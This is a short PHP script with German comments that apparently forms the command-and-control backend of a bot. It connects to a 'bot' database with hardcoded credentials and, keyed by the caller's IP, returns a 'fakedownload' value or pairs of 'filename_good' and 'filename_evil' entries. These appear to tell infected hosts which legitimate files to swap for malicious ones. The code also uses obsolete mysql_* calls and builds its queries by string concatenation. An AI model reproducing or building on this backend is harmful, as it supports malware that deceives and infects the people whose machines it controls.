<?php

// MySQL Connection
$mysqlhost="localhost"; // MySQL-Host angeben
$mysqluser="bdd"; // MySQL-User angeben
$mysqlpwd="bdd"; // Passwort angeben
$mysqldb="bot"; // Gewuenschte Datenbank angeben

$connection=mysql_connect($mysqlhost, $mysqluser, $mysqlpwd) or die ("Verbindungsversuch fehlgeschlagen");
mysql_select_db($mysqldb, $connection) or die("Konnte die Datenbank nichtwaehlen.");

// Get Parameter
$id = $_GET["id"];

if (isset($id) && intval($id) === 1)
{
	$sql = "SELECT fakedownload FROM config WHERE ip='". $_SERVER['REMOTE_ADDR']."'";
	$adressen_query = mysql_query($sql) or die("Anfrage nicht erfolgreich");
	$adr = mysql_fetch_array($adressen_query);
	
	echo $adr['fakedownload'];
}
else if (isset($id) && intval($id) === 2)
{
	$sql = "SELECT * FROM config WHERE ip='". $_SERVER['REMOTE_ADDR']."'";
	$adressen_query = mysql_query($sql) or die("Anfrage nicht erfolgreich");
	
	while($row = mysql_fetch_assoc($adressen_query))
	{		
		echo $row['category']. "&" .$row['filename_good']. "&" .$row['filename_evil']. "|";
  } 
}

mysql_close($connection);

?>
